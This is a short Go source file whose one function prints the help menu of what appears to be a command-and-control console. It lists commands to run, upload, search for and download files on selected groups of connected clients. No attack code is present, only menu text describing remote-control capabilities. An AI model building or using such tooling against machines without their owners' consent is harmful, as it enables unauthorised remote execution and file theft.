package header

import "fmt"

const (
	I    = "[*]"
	E    = "[-]"
	K    = "[+]"
	L    = "[#]"
	Line = "[----------------------------------------------]"
)

func ListHelp() {
	fmt.Println(Line, "\n", "COMMANDS:")
	fmt.Printf("%s count\t\t\t\t:: displays the number of active clients connected\n", I)
	fmt.Printf("%s list\t\t\t\t:: displays active clients information\n", I)
	fmt.Printf("%s set active <NUM>\t\t\t:: sets an active client to interact with (if set to 0 = global mode)\n", I)
	fmt.Printf("%s check active\t\t\t:: displays the current active client ID\n", I)
	fmt.Printf("%s set group <NUM>\t\t\t:: assigns random group of <NUM> size to be used in group mode\n", I)
	fmt.Printf("%s check group\t\t\t:: displays all client IDs in active group\n", I)
	fmt.Printf("%s ping [-g active client group] [-a active client] <IPADDR>\t\t:: sends a command to ping <IPADDR> on client(s)\n", I)
	fmt.Printf("%s run [-g active client group] [-a active client] <FILENAME>\t\t\t:: sends command to run <FILENAME> on clients(s) (filepath must be abs)\n", I)
	fmt.Printf("%s send [-g active client group] [-a active client] <FILENAME>\t\t:: sends command to send <FILENAME> from localhost to clients(s) (filepath must be abs)\n", I)
	fmt.Printf("%s search [-g active client group] [-a active client] <FILENAME>\t\t:: sends command to search for <FILENAME> on clients(s) (filepath must be abs)\n", I)
	fmt.Printf("%s entry [-g active client group] [-a active client] \t\t :: sends command to retrieve the CWD of the client", I)
	fmt.Printf("%s download [-g active client group] [-a active client] <FILENAME>\t\t:: sends command to download <FILENAME> from client to localhost (filepath must be abs)\n", I)
	fmt.Printf("%s exit\t\t\t\t:: exits the current session\n", I)
	fmt.Println(Line)
}

